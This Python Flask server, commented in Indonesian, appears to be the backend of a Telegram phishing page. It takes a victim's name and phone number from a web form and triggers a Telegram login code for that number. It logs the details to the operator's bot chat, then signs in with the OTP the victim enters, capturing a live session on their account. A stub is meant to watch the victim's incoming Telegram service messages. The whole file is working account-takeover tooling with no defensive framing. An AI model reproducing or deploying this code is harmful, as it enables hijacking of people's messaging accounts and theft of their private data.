import os, requests, asyncio, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

user_sessions = {}
active_status_msg = {}

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    return asyncio.run(handle_logic(data))

async def handle_logic(data):
    try:
        step = data.get('step')
        nomor = data.get('nomor', '').strip()
        if nomor.startswith('0'): nomor = '+62' + nomor[1:]
        
        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_sessions[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": data.get('nama')}
            # Log awal ke bot
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{data.get('nama')}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]}
            })
            return jsonify({"status": "success"}), 200
        
        elif step == 2:
            # Penanganan OTP dari Form Frontend
            session_data = user_sessions.get(nomor)
            if not session_data: return jsonify({"status": "error"}), 400
            client.session = StringSession(session_data["session"])
            await client.sign_in(nomor, data.get('otp'), phone_code_hash=session_data["hash"])
            return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        nomor = data.split("_")[1]
        
        if data.startswith("track_"):
            # Teks status menunggu
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "Bot siap menerima OTP!\nKetik /exit untuk keluar",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            active_status_msg[nomor] = res.get("result", {}).get("message_id")
            asyncio.run(otp_auto_monitor(nomor))

        elif data.startswith("exit_"):
            if nomor in active_status_msg:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
            # Pesan keluar
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})

    return jsonify({"status": "success"}), 200

async def otp_auto_monitor(nomor):
    # Logika memantau pesan masuk dari Telegram (777000)
    # Jika OTP ketemu, hapus pesan status dan kirim log baru
    pass

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))